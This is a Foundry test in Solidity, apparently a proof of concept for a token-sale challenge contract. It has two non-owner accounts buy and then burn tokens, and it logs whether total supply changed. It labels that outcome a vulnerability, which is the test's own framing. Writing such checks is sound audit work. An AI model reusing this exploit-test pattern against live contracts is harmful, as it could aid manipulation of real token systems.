// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/tokensalechallenge.sol";

contract TokenSaleBurnTest is Test {
    TokenSaleChallenge tokenSale;
    address owner = makeAddr("owner");
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() public {
        vm.deal(owner, 1 ether);
        vm.deal(alice, 10 ether);
        vm.deal(bob, 10 ether);

        vm.startPrank(owner);
        tokenSale = new TokenSaleChallenge{value: 1 ether}(address(this));
        vm.stopPrank();
    }

    function testNonOwnerCanBurnManipulateSupply() public {
        // Alice buys 5 tokens
        vm.prank(alice);
        tokenSale.buy{value: 5 ether}(5);
        
        // Bob buys 5 tokens
        vm.prank(bob);
        tokenSale.buy{value: 5 ether}(5);

        console.log("\n--- BEFORE-Trigger Burn ---");
        uint256 initialSupply = tokenSale.getTotalSupply();
        uint256 aliceBalanceBefore = tokenSale.balanceOf(alice);
        uint256 bobBalanceBefore = tokenSale.balanceOf(bob);
        uint256 totalBurnedBefore = tokenSale.totalTokensBurned();

        console.log("Initial Total Supply:        %s tokens", initialSupply);
        console.log("Alice Balance Before Burn:   %s tokens", aliceBalanceBefore);
        console.log("Bob Balance Before Burn:     %s tokens", bobBalanceBefore);
        console.log("Total Tokens Burned Before:  %s tokens", totalBurnedBefore);

        console.log("\n--- Trigger Burn Operation (non-owners) ---");
        // Non-owners burn tokens to manipulate supply
        vm.prank(alice);
        tokenSale.burn(5);

        vm.prank(bob);
        tokenSale.burn(5);

        console.log("\n--- AFTER-Trigger Burn ---");
        uint256 finalSupply = tokenSale.getTotalSupply();
        uint256 aliceBalanceAfter = tokenSale.balanceOf(alice);
        uint256 bobBalanceAfter = tokenSale.balanceOf(bob);
        uint256 totalBurnedAfter = tokenSale.totalTokensBurned();

        console.log("Final Total Supply:          %s tokens", finalSupply);
        console.log("Alice Balance After Burn:    %s tokens", aliceBalanceAfter);
        console.log("Bob Balance After Burn:      %s tokens", bobBalanceAfter);
        console.log("Total Tokens Burned After:   %s tokens", totalBurnedAfter);

        // Calculate state changes
        uint256 supplyChange = initialSupply - finalSupply;
        uint256 aliceChange = aliceBalanceBefore - aliceBalanceAfter;
        uint256 bobChange = bobBalanceBefore - bobBalanceAfter;
        uint256 burnedChange = totalBurnedAfter - totalBurnedBefore;

        console.log("\n--- State Change Verdict ---");
        console.log("Total Supply Change:         %s tokens (expected 10)", supplyChange);
        console.log("Alice Balance Change:        %s tokens (expected 5)", aliceChange);
        console.log("Bob Balance Change:          %s tokens (expected 5)", bobChange);
        console.log("Total Burned Change:         %s tokens (expected 10)", burnedChange);

        // Vulnerability validation
        bool burnSucceeded = supplyChange == 10 && 
                            aliceChange == 5 && 
                            bobChange == 5 && 
                            burnedChange == 10;

        if (burnSucceeded) {
            console.log("Vulnerability Exists: Non-owners successfully manipulated token supply through burns");
        } else {
            console.log("Vulnerability not Exist: State changes don't match expected burn effects");
        }
    }
}